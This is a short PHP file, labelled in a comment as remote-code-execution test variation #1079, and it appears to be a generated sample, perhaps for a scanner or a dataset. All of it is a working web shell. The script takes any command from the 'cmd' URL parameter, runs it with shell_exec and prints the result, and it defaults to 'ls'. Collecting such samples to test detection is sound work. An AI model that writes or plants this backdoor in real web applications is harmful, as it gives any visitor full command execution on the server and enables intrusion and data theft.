<?php
// RCE test variation #1079
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>